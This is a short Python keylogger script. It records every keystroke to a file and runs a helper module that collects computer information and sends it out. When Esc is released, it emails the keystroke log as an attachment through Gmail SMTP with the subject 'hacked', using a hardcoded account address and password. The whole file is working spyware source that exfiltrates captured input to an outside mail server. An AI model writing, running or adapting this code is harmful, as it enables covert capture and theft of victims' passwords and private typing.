from pynput import keyboard
from pynput.keyboard import Key, Listener
import smtplib
import mimetypes
from email.message import EmailMessage
import comp

cpi=comp.ComputerInfo('COMPUTERinfo.txt')
cpi.storedata()
cpi.sendData()

class KeyLogger():

    def __init__(self, filename):
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    
    def on_press(self, key):
        print(key)
        with open(self.filename, 'a') as logs:
            logs.write(f'{self.get_char(key)}\n')
            
    
    
    def on_release(self, key):
        if key==Key.esc:
            message2=EmailMessage()
            sender = "pythonproject.py@gmail.com"
            recipient = "pythonproject.py@gmail.com"
            message2['From'] = sender
            message2['To'] = recipient
            message2['Subject'] = 'hacked'
            body = 'keylogs'
            message2.set_content(body)
            mime_type, _ = mimetypes.guess_type(self.filename)
            mime_type, mime_subtype = mime_type.split('/')
            with open(self.filename, 'rb') as file:
                message2.add_attachment(file.read(),maintype=mime_type,subtype=mime_subtype,filename=self.filename)
            mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
            mail_server.set_debuglevel(1)
            mail_server.login("pythonproject.py@gmail.com", 'Password56789') 
            mail_server.send_message(message2)
            mail_server.quit()
            


         
    def main(self):
        with Listener(on_press=self.on_press,on_release=self.on_release) as listener:
            listener.join()
            
logger = KeyLogger('keylogs.txt')
logger.main()
